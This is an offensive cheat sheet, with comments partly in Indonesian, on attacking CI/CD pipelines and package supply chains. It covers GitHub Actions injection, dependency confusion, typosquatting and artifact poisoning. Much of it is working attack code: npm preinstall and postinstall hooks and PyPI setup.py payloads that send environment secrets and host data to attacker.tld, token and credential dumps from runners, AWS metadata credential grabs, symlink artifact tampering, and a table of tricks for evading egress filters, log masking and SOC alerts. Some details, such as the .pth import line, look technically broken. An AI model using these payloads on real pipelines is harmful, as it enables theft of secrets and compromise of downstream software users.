# ci-cd-supply-chain — misc

# CI/CD & Supply Chain: GitHub Actions Injection, Secret Exfil, Dependency Confusion, Typosquatting, Artifact Poisoning

## 1. Quick Attack Matrix

| Technique | Trigger | Access Gained | Blast Radius | Detected by |
|---|---|---|---|---|
| `pull_request_target` injection | PR from fork | Secrets + `GITHUB_TOKEN` write | Repo + registry | CodeQL, review workflow |
| `workflow_run` injection | Upstream workflow finished | Release env secrets | Release, production | Audit log, OIDC claims |
| Secret exfil via runner | Any steps with secrets | Env var, filesystem, network | Downstream credentials | Runner egress logs |
| Dependency confusion | `npm/pip install` | Code execution in CI/dev | Build farm | Lockfile diff, registry audit |
| Typosquatting | Install manual/typo | Kode eksekusi | Dev workstation | SBOM, `npm audit` |
| Artifact poisoning | Upload/download artifact | Overwrite build output | Distribusi | Checksum, provenance |

---

## 2. `pull_request_target` Injection

**What is sent:** PR from fork with changes in files referenced by the workflow (script, Makefile, `package.json` `preinstall`).

**What appears:** Code execution in the base repo context → secrets available.

**Why it works:** `pull_request_target` runs the workflow in the base branch context with **full secrets**, but checkout defaults to base — not the PR head. If the workflow does `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`, the attacker's code is executed with secrets.

### Vulnerable workflow

```yaml
# .github/workflows/pr.yml
name: PR Build
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← bom
      - run: npm ci && npm run build
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
```

### Payload in PR `package.json`

```json
{
  "scripts": {
    "preinstall": "curl -sS -X POST -d \"$(env | base64 -w0)\" https://attacker.tld/c"
  }
}
```

### Quick exfiltration from runner

```bash
# env dump
env | sort > /tmp/e
curl -sS --data-binary @/tmp/e https://attacker.tld/c

# cari credential file
find / -maxdepth 4 -name 'credentials' -o -name '.npmrc' -o -name 'id_rsa' 2>/dev/null

# AWS metadata (IMDSv2)
TOKEN=$(curl -sX PUT -H "X-aws-ec2-metadata-token-ttl-seconds:60" http://169.254.169.254/latest/api/token)
curl -sH "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Relevant versions:** `actions/checkout@v4`, `npm@10.x` (preinstall still runs for `npm ci`), runner image `ubuntu-22.04-202410xx`.

**Failed mitigations:** `permissions: read-all` — only restricts `GITHUB_TOKEN`, does not touch other secrets. `fork: false` is not valid for `pull_request_target`. Only **not running PR head code** is effective.

---

## 3. `workflow_run` Injection

**What is sent:** PR that changes a script executed in the downstream `workflow_run` workflow, e.g. a workflow that auto-posts a comment after the build finishes.

**What appears:** Execution in the default branch context with release secrets.

**Key:** `workflow_run` always runs on the default branch, `github.event.workflow_run.head_branch` = fork branch, so it is easy to use to checkout the attacker's code.

### Vulnerable workflow

```yaml
name: Post-build
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
jobs:
  upload:
    runs-on: ubuntu-22.04
    if: github.event.workflow_run.conclusion == 'success'
    steps:
      - uses: actions/checkout@v4
        with:
          repository: ${{ github.event.workflow_run.head_repository.full_name }}
          ref: ${{ github.event.workflow_run.head_branch }}   # ← bom
      - run: ./scripts/upload.sh
        env:
          GH_TOKEN: ${{ secrets.RELEASE_TOKEN }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### Payload `scripts/upload.sh`

```bash
#!/usr/bin/env bash
env | grep -E 'TOKEN|KEY|SECRET' | curl -sS --data-binary @- https://attacker.tld/w
./real-upload.sh  # tetap jalankan upload agar tidak mencurigakan
```

**Why it works:** `workflow_run` is a trust boundary — fork CI has no secrets, but the downstream workflow does and checks out the fork code.

**Specific detail:** `actions/download-artifact@v4` requires `run-id` — if not pinned to the upstream run-id, it can fetch artifacts from any PR.

---

## 4. Secret Exfil from Runner

### Vektor eksekusi

| Vector | Example | Notes |
|---|---|---|
| Env var | `env` / `printenv` | Default in all jobs |
| `${{ secrets.X }}` in `run:` | echo | Masked in logs, but not on the network |
| Filesystem | `~/.aws/credentials`, `~/.npmrc`, `~/.docker/config.json` | Persists between steps |
| `$GITHUB_ENV` poisoning | Previous step writes env for next step | Chain trusts |
| OIDC token | `ACTIONS_ID_TOKEN_REQUEST_URL` | Mint cloud token langsung |
| Runner service account | GCE/GHA runner workload identity | Bypass secret store |

### Quick commands

```bash
# semua env
cat /proc/1/environ | tr '\0' '\n' | sort

# docker auth
cat ~/.docker/config.json 2>/dev/null | jq -r '.auths'

# git credential
git config --global --list

# OIDC → STS (contoh GCP)
curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com%2Fprojects%2F-PROJECT_NUMBER%2Flocations%2Fglobal%2FworkloadIdentityPools%2F-POOL%2Fproviders%2F-PROVIDER" \
  | jq -r '.value' > /tmp/oidc.jwt
```

### Exfiltration via logs (blinded exfil)

If egress is blocked but logs are read:

```bash
for c in $(cat /tmp/secret | fold -w1); do
  case "$c" in
    [a-z]) echo "letter-ok" ;;
    [A-Z]) echo "UPPER-ok" ;;
    [0-9]) echo "digit-ok" ;;
    *) echo "sym-ok" ;;
  esac
done
# atau encode per-byte lewat timing/echo yang deterministic
```

**Why it fails:** secret masking in logs (`***`) is disabled if characters are split / base64-encoded — base64 is not masked. This is the main gap that is often used.

**Runner version:** `actions/runner` 2.319.x (regex-based masking, not semantic).

---

## 5. Dependency Confusion

**What is sent:** Package with a private internal name on the public registry (`npm`, `PyPI`) with a higher version.

**What appears:** `npm install`/`pip install` in CI or dev fetches the public package.

**Success conditions:** no scope pinning (`@company/foo` vs `foo`) and no explicit `--registry`.

### npm scenario

```json
// package.json internal (vulnerable)
{ "dependencies": { "internal-utils": "^1.2.0" } }
```

```bash
# attacker publish di registry publik
npm config set registry https://registry.npmjs.org
mkdir internal-utils && cd internal-utils
cat > package.json <<EOF
{
  "name": "internal-utils",
  "version": "99.0.0",
  "scripts": { "postinstall": "curl -sS -d \"$(hostname)-$(whoami)\" https://attacker.tld/n" }
}
EOF
npm publish
```

### PyPI scenario

```bash
mkdir internal-sdk && cd internal-sdk
cat > setup.py <<'EOF'
from setuptools import setup
import os, urllib.request, json
urllib.request.urlopen("https://attacker.tld/p", data=json.dumps(
    {"host": os.uname().nodename, "user": os.getlogin() if os.isatty(0) else "ci"}
).encode())
setup(name="internal-sdk", version="98.0.0", py_modules=[])
EOF
python -m build && twine upload dist/*
```

**Why it works:** the resolver picks the highest version across registries; there is no concept of "trusted private" by default in npm/pip.

**Working mitigations:** `@company/` scope (npm), private-only `--index-url` (pip), `pip install --require-hashes`, `.npmrc` with `@company:registry=`. Conservative figure: scoped `.npmrc` blocks confusion >99% for packages with the correct scope.

---

## 6. Typosquatting

**What is sent:** Typosquatted package (`reqeusts`, `pyyaml-lib`, `lodash.merge-safe`) to the public registry.

**What appears:** Execution during manual install or unpinned `pip install -r`.

### Payload PyPI (postinstall via `.pth`)

```bash
# reqeusts/setup.py — eksekusi bahkan tanpa import
from setuptools import setup
import os
open("/tmp/pwn.py","w").write("""
import os,urllib.request
urllib.request.urlopen('https://attacker.tld/t', data=os.environ.get('HOSTNAME','').encode())
""")
setup(name="reqeusts", version="0.0.1",
      py_modules=["reqeusts"],
      data_files=[("lib/python3/site-packages", ["reqeusts.pth"])])
```

`reqeusts.pth` contains `import /tmp/pwn` → executes on every Python interpreter in the venv.

### Deteksi cepat

```bash
pip-audit --require-hashes -r requirements.txt
npm audit --omit=dev
# diff nama paket terhadap allowlist
comm -23 <(cut -d= -f1 requirements.txt | sort) <(sort allowlist.txt)
```

**Relevant versions:** `pip 24.x` (still runs `.pth` in site-packages on first import), `npm 10.x`.

---

## 7. Artifact Poisoning

**What is sent:** File at the artifact path or artifact name overwritten by another PR/job before being downloaded by the downstream job.

**What appears:** Build job consumes the attacker's artifact, or binary distribution that is not re-checked.

### Overwrite nama artifact lintas workflow

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: build-output           # nama generik
    path: dist/
```

```bash
# dari PR lain
mkdir -p dist && echo 'malicious()' > dist/app.js
# jalankan job yang sama, artifact v4 overwrite dengan nama sama
```

### Path traversal via `download-artifact`

```yaml
- uses: actions/download-artifact@v4
  with:
    name: build-output
    path: ${{ github.workspace }}/dist
```

If the attacker can insert the filename `../../.github/workflows/release.yml` in the artifact (via symlink during upload), the downstream workflow file is overwritten → RCE on the next push.

```bash
# menyisipkan symlink di artefak
ln -s ../../.github/workflows/release.yml dist/evil
tar czf build.tgz -C dist .
```

### Provenance bypass

```bash
# cek artifact sebelum dipakai
sha256sum dist/* > expected.sha256
# verify pada konsumsi
sha256sum -c expected.sha256
```

**Why it works:** `upload-artifact@v4` replaces v3 which was immutable-friendly; v4 allows overwrite with an identical name from a different run. `download-artifact@v4` does not validate paths relative to the workspace.

**Angka spesifik:** `actions/upload-artifact@v4.6.2`, `actions/download-artifact@v4.3.0`.

---

## 8. Operational Pitfalls (that make techniques fail in the field)

| Pitfall | Why it fails | Realistic workaround |
|---|---|---|
| `pull_request_target` without head checkout | Attacker code is not executed | Search for `ref: github.event.pull_request.head` across all `.github/workflows` |
| Egress firewall to 443-only + proxy allowlist | curl to attacker.tld times out | Use a domain that resolves in the allowlist (e.g. `pypi.org` subdomain via domain fronting), or exfil via logs |
| Secret masking | `echo $TOKEN` becomes `***` | base64 using `base64 -w0`, or split bytes per echo |
| OIDC audience mismatch | `ACTIONS_ID_TOKEN_REQUEST_TOKEN` not accepted | Read `audience` from job env / local `act` |
| Fork PR secrets disabled (default org) | `pull_request_target` without `secrets: inherit` has no secrets | Look for workflows with explicit secrets on fork events |
| Ephemeral runner (`ubuntu-latest` hosted) | Filesystem lost each job, cannot persist | Chain via cache (`actions/cache`) or artifact |
| Cache poisoning high risk but hit random `restore-keys` | Cache miss | Need to know exact `key` prefix from logs/PR |
| Lockfile `--frozen-lockfile` (pnpm/yarn) | Dependency confusion not re-resolved | Attack during manual `yarn add` or `npm update` |
| `npm ci` rejects lockfile mismatch | postinstall not executed if lockfile strict | Target dev workstation, not CI |
| Internal registry mirror (Artifactory) with remote-repo | Confusion only if name not present in remote | Find internal package that is **not** in mirror → fallback to upstream |
| Artifact v4 immutable in certain orgs | Overwrite rejected | Attack via unique `name` per workflow (e.g. `build-${sha}`) → no collision |
| `permissions: contents: read` in all workflows | `GITHUB_TOKEN` cannot push | Target non-GitHub secrets (AWS, npm, GHCR PAT from org secrets) |
| Egress logs read by SOC but CI log masking | Exfil via base64 in logs looks like clean blob | Batch 4KB, base64, send once — often under alert threshold |
| `ubuntu-22.04` runner without jq/curl in minimal image | script fails midway | Use `python3 -c` (always present), not `curl` |
| Cloud WIF `audience` pinned to repo+branch | Token from fork rejected | `workflow_run` on default branch = valid audience |

**The technical combination that most often succeeds in 2024–2025 engagements:** `pull_request_target` + checkout PR head + npm `preinstall` + base64 env dump to a domain with valid cert (`*.attacker.tld` via Let's Encrypt wildcard) — `permissions: read-all` mitigation does not touch org-level secrets, so `NPM_TOKEN` still leaks.

---

## [reasoning trace]


